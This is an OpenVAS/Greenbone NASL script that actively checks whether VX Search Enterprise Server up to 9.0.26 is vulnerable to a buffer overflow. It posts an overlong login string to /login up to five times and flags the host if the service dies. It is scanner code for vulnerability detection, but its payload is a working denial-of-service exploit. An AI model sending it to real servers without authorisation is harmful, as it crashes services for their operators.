# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vx:search_enterprise";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809061");
  script_version("2025-09-09T14:09:45+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-09-09 14:09:45 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-10-10 10:19:35 +0530 (Mon, 10 Oct 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("VX Search Enterprise Server <= 9.0.26 Buffer Overflow Vulnerability - Active Check");

  script_tag(name:"summary", value:"VX Search Enterprise Server is prone to a buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST and check whether it is
  able to crash the server or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing web requests and can
  be exploited to cause a buffer overflow via an overly long string passed to 'Login' request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"VX Search Enterprise version 9.0.26 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40455");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138995");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_vx_search_enterprise_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("vx_search/enterprise/http/detected", "Host/runs_windows");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

host = http_host_name(port:port);

exploit = crap(data:"0x41", length:12292);
PAYLOAD = "username=test" + "&password=test" + "\r\n" + exploit;

url = "/login";
req = http_post_put_req(port:port, url:url, data:PAYLOAD, add_headers:
                        make_array("Content-Type", "application/x-www-form-urlencoded",
                                   "Origin", "http://" + host,
                                   "Content-Length", strlen(PAYLOAD)));

# nb: Send multiple times, inconsistency issue
for(j = 0; j < 5; j++) {
  http_send_recv(port:port, data:req);
  if(http_is_dead(port:port)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
